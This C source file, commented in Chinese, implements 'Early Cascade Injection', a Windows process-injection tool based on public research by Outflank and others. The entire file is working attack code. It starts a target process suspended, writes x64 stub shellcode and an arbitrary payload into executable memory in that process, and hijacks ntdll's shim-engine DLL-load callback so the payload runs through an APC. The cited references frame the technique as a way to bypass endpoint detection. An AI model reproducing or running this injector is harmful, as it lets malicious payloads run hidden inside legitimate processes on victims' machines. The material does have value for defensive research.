/**
 * ===================================================================
 * Early Cascade Injection - 主注入器
 * ===================================================================
 *
 * 原理：利用 Windows Shim Engine 机制在 DLL 加载时执行代码
 *
 * 核心思想：
 * 1. ntdll.dll 包含 Shim Engine 支持
 * 2. g_ShimsEnabled - 控制是否启用 shim 引擎
 * 3. g_pfnSE_DllLoaded - DLL 加载时的回调函数指针（编码过）
 * 4. 当进程加载 DLL 时，如果 g_ShimsEnabled=TRUE，会调用 g_pfnSE_DllLoaded
 *
 * 工作流程：
 * 1. 创建挂起的目标进程
 * 2. 分配远程内存（stub + payload）
 * 3. 写入 stub shellcode（负责禁用 shim 并队列 APC）
 * 4. 写入 payload shellcode
 * 5. 启用 shim 引擎：g_ShimsEnabled = TRUE
 * 6. 设置 DLL 加载回调：g_pfnSE_DllLoaded = EncodePointer(stub)
 * 7. 恢复进程执行
 * 8. 进程加载第一个 DLL 时，触发 stub
 * 9. Stub 禁用 shim 引擎，然后通过 APC 执行 payload
 *
 * 参考：
 * - https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection/
 * - https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html
 * - https://github.com/Cracked5pider/earlycascade-injection
 */

#include <windows.h>
#include <stdio.h>
#include <winternl.h>

// ===== Stub Shellcode =====
// 这个 shellcode 会在 DLL 加载时被调用
// 它会：
// 1. 禁用 shim 引擎
// 2. 使用 NtQueueApcThread 将 payload 队列到当前线程
//
// 占位符会在运行时被替换：
// 0x9999999999999999 → g_ShimsEnabled 地址
// 0x8888888888888888 → Payload 地址
// 0x7777777777777777 → Context 地址（可选）
// 0x6666666666666666 → NtQueueApcThread 地址

unsigned char cascade_stub_x64[] = {
    0x48, 0x83, 0xec, 0x38,                          // sub rsp, 38h
    0x33, 0xc0,                                      // xor eax, eax
    0x45, 0x33, 0xc9,                                // xor r9d, r9d
    0x48, 0x21, 0x44, 0x24, 0x20,                    // and [rsp+38h+var_18], rax

    0x48, 0xba,                                      // mov rdx, imm64 (offset: 16)
    0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,  // → Payload 地址

    0xa2,                                            // mov ds:imm64, al (offset: 25)
    0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,  // → g_ShimsEnabled 地址

    0x49, 0xb8,                                      // mov r8, imm64 (offset: 35)
    0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77,  // → Context 地址

    0x48, 0x8d, 0x48, 0xfe,                          // lea rcx, [rax-2]  ; NtCurrentThread() = -2

    0x48, 0xb8,                                      // mov rax, imm64 (offset: 49)
    0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,  // → NtQueueApcThread 地址

    0xff, 0xd0,                                      // call rax
    0x33, 0xc0,                                      // xor eax, eax
    0x48, 0x83, 0xc4, 0x38,                          // add rsp, 38h
    0xc3                                             // ret
};

/**
 * ===================================================================
 * 查找 PE 节
 * ===================================================================
 */
PVOID FindPeSection(PVOID ModuleBase, const char* SectionName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ModuleBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)ModuleBase + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(SectionName, sectionHeader[i].Name, strlen(SectionName)) == 0) {
            return (PVOID)((ULONG_PTR)ModuleBase + sectionHeader[i].VirtualAddress);
        }
    }

    return NULL;
}

/**
 * ===================================================================
 * 编码函数指针
 *
 * 使用 SharedUserData->Cookie 进行指针编码
 * 参考：https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html
 *
 * SharedUserData 位于固定地址：0x7FFE0000
 * Cookie 偏移：0x330
 * ===================================================================
 */
PVOID EncodePointer(PVOID FnPointer) {
    // SharedUserData->Cookie 位于 0x7FFE0330
    ULONG cookie = *(ULONG*)0x7FFE0330;
    ULONG_PTR encoded = cookie ^ (ULONG_PTR)FnPointer;

    // _rotr64(encoded, cookie & 0x3F)
    ULONG shift = cookie & 0x3F;
    encoded = (encoded >> shift) | (encoded << (64 - shift));

    return (PVOID)encoded;
}

/**
 * ===================================================================
 * 读取文件到内存
 * ===================================================================
 */
BOOL ReadFileToMemory(const char* fileName, PVOID* buffer, DWORD* length) {
    HANDLE hFile = CreateFileA(fileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open file: %s (Error: %lu)\n", fileName, GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("[-] Failed to get file size (Error: %lu)\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    *buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
    if (!*buffer) {
        printf("[-] Failed to allocate memory\n");
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, *buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[-] Failed to read file (Error: %lu)\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, *buffer);
        CloseHandle(hFile);
        return FALSE;
    }

    *length = fileSize;
    CloseHandle(hFile);
    return TRUE;
}

/**
 * ===================================================================
 * Early Cascade 注入
 * ===================================================================
 */
BOOL EarlyCascadeInject(const char* targetProcess, PVOID payload, DWORD payloadSize) {
    PROCESS_INFORMATION pi;
    STARTUPINFOA si = { sizeof(si) };
    PVOID remoteMemory = NULL;
    DWORD totalSize = 0;
    DWORD offset = 0;
    BOOL success = FALSE;

    printf("[*] Target Process: %s\n", targetProcess);
    printf("[*] Payload Size: %lu bytes\n", payloadSize);

    // 第一步：创建挂起的目标进程
    printf("\n[*] Step 1: Creating suspended process...\n");
    if (!CreateProcessA(NULL, (LPSTR)targetProcess, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to create process (Error: %lu)\n", GetLastError());
        return FALSE;
    }
    printf("[+] Process created (PID: %lu)\n", pi.dwProcessId);

    // 第二步：分配远程内存
    printf("\n[*] Step 2: Allocating remote memory...\n");
    totalSize = sizeof(cascade_stub_x64) + payloadSize;

    remoteMemory = VirtualAllocEx(pi.hProcess, NULL, totalSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        printf("[-] Failed to allocate remote memory (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Remote memory allocated at: 0x%p (Size: %lu bytes)\n", remoteMemory, totalSize);

    // 第三步：解析 ntdll.dll 中的关键地址
    printf("\n[*] Step 3: Resolving ntdll.dll addresses...\n");
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll.dll handle\n");
        goto CLEANUP;
    }

    // 查找 .mrdata 和 .data 节
    PVOID secMrdata = FindPeSection(hNtdll, ".mrdata");
    PVOID secData = FindPeSection(hNtdll, ".data");

    if (!secMrdata || !secData) {
        printf("[-] Failed to find ntdll.dll sections\n");
        goto CLEANUP;
    }

    // 硬编码偏移（特定于 Windows 版本）
    // 注意：这些偏移可能在不同 Windows 版本中变化
    PVOID g_ShimsEnabled = (PVOID)((ULONG_PTR)secData + 0x6cf0);
    PVOID g_pfnSE_DllLoaded = (PVOID)((ULONG_PTR)secMrdata + 0x270);

    printf("[+] g_ShimsEnabled   : 0x%p\n", g_ShimsEnabled);
    printf("[+] g_pfnSE_DllLoaded: 0x%p\n", g_pfnSE_DllLoaded);

    // 第四步：准备 stub shellcode
    printf("\n[*] Step 4: Preparing stub shellcode...\n");
    unsigned char stub[sizeof(cascade_stub_x64)];
    memcpy(stub, cascade_stub_x64, sizeof(cascade_stub_x64));

    // 替换占位符
    // Offset 16: Payload 地址
    ULONG_PTR payloadAddr = (ULONG_PTR)remoteMemory + sizeof(cascade_stub_x64);
    memcpy(&stub[16], &payloadAddr, sizeof(PVOID));

    // Offset 25: g_ShimsEnabled 地址
    memcpy(&stub[25], &g_ShimsEnabled, sizeof(PVOID));

    // Offset 35: Context 地址（我们不使用，设为 0）
    ULONG_PTR contextAddr = 0;
    memcpy(&stub[35], &contextAddr, sizeof(PVOID));

    // Offset 49: NtQueueApcThread 地址
    PVOID pNtQueueApcThread = GetProcAddress(hNtdll, "NtQueueApcThread");
    if (!pNtQueueApcThread) {
        printf("[-] Failed to get NtQueueApcThread address\n");
        goto CLEANUP;
    }
    memcpy(&stub[49], &pNtQueueApcThread, sizeof(PVOID));

    printf("[+] Stub prepared with patched addresses\n");

    // 第五步：写入 stub 和 payload
    printf("\n[*] Step 5: Writing stub and payload to remote process...\n");

    // 写入 stub
    if (!WriteProcessMemory(pi.hProcess, remoteMemory, stub, sizeof(stub), NULL)) {
        printf("[-] Failed to write stub (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Stub written (%zu bytes)\n", sizeof(stub));

    // 写入 payload
    offset = sizeof(stub);
    PVOID payloadRemote = (PVOID)((ULONG_PTR)remoteMemory + offset);
    if (!WriteProcessMemory(pi.hProcess, payloadRemote, payload, payloadSize, NULL)) {
        printf("[-] Failed to write payload (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Payload written (%lu bytes)\n", payloadSize);

    // 第六步：启用 Shim Engine
    printf("\n[*] Step 6: Enabling Shim Engine...\n");

    // 设置 g_ShimsEnabled = TRUE
    BYTE enabled = TRUE;
    if (!WriteProcessMemory(pi.hProcess, g_ShimsEnabled, &enabled, sizeof(BYTE), NULL)) {
        printf("[-] Failed to enable shim engine (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] g_ShimsEnabled set to TRUE\n");

    // 第七步：设置 DLL 加载回调
    printf("\n[*] Step 7: Setting DLL load callback...\n");

    // 编码 stub 地址
    PVOID encodedStub = EncodePointer(remoteMemory);
    if (!WriteProcessMemory(pi.hProcess, g_pfnSE_DllLoaded, &encodedStub, sizeof(PVOID), NULL)) {
        printf("[-] Failed to set callback pointer (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] g_pfnSE_DllLoaded set to encoded stub address: 0x%p\n", encodedStub);

    // 第八步：恢复进程执行
    printf("\n[*] Step 8: Resuming process...\n");
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        printf("[-] Failed to resume thread (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Process resumed\n");

    printf("\n===================================================================\n");
    printf("[+] Early Cascade injection completed!\n");
    printf("[+] When the process loads the first DLL, stub will execute\n");
    printf("[+] Stub will disable shim engine and queue APC with payload\n");
    printf("===================================================================\n");

    // 等待并验证注入效果
    printf("\n[*] Waiting 5 seconds to verify injection...\n");
    Sleep(5000);

    DWORD exitCode = 0;
    if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
        if (exitCode != STILL_ACTIVE) {
            printf("[+] Target process exited (Exit code: %u) - Payload executed!\n", exitCode);

            // 创建验证文件
            HANDLE hMarker = CreateFileA(
                "C:\\Users\\Public\\early_cascade_verified.txt",
                GENERIC_WRITE,
                0,
                NULL,
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );

            if (hMarker != INVALID_HANDLE_VALUE) {
                char msg[1024];
                snprintf(msg, sizeof(msg),
                    "Early Cascade Injection Verified!\n"
                    "Target Process: %s\n"
                    "Process PID: %u\n"
                    "Remote Memory: 0x%p\n"
                    "g_ShimsEnabled: 0x%p\n"
                    "g_pfnSE_DllLoaded: 0x%p\n"
                    "Encoded Stub Pointer: 0x%p\n"
                    "Stub Size: %zu bytes\n"
                    "Payload Size: %u bytes\n"
                    "Exit Code: %u\n"
                    "Status: Process exited - shellcode executed!\n"
                    "Technique: Hook DLL load callback via Shim Engine\n"
                    "Execution Timing: First DLL load triggers stub -> APC queues payload\n",
                    targetProcess,
                    pi.dwProcessId,
                    remoteMemory,
                    g_ShimsEnabled,
                    g_pfnSE_DllLoaded,
                    encodedStub,
                    sizeof(stub),
                    payloadSize,
                    exitCode
                );
                DWORD written;
                WriteFile(hMarker, msg, strlen(msg), &written, NULL);
                CloseHandle(hMarker);
                printf("[+] Verification file created: C:\\Users\\Public\\early_cascade_verified.txt\n");
            }
        } else {
            printf("[!] Target process still running (PID: %u)\n", pi.dwProcessId);
        }
    }

    success = TRUE;

CLEANUP:
    if (pi.hThread) CloseHandle(pi.hThread);
    if (pi.hProcess) CloseHandle(pi.hProcess);

    return success;
}

/**
 * ===================================================================
 * 主函数
 * ===================================================================
 */
int main(int argc, char* argv[]) {
    printf("===================================================================\n");
    printf("Early Cascade Injection\n");
    printf("Based on: github.com/Cracked5pider/earlycascade-injection\n");
    printf("Reference: outflank.nl/blog/2024/10/15/early-cascade-injection/\n");
    printf("===================================================================\n\n");

    if (argc < 3) {
        printf("Usage: %s <target_process> <payload.bin>\n", argv[0]);
        printf("\nExample:\n");
        printf("  %s \"C:\\Windows\\System32\\notepad.exe\" payload.bin\n", argv[0]);
        return 1;
    }

    // 读取 payload
    PVOID payload = NULL;
    DWORD payloadSize = 0;

    if (!ReadFileToMemory(argv[2], &payload, &payloadSize)) {
        return 1;
    }

    printf("[+] Payload loaded: %lu bytes\n\n", payloadSize);

    // 执行注入
    BOOL result = EarlyCascadeInject(argv[1], payload, payloadSize);

    // 清理
    if (payload) {
        HeapFree(GetProcessHeap(), 0, payload);
    }

    if (!result) {
        printf("\n[-] Injection failed!\n");
        return 1;
    }

    printf("\n[*] Press Enter to exit...\n");
    getchar();

    return 0;
}
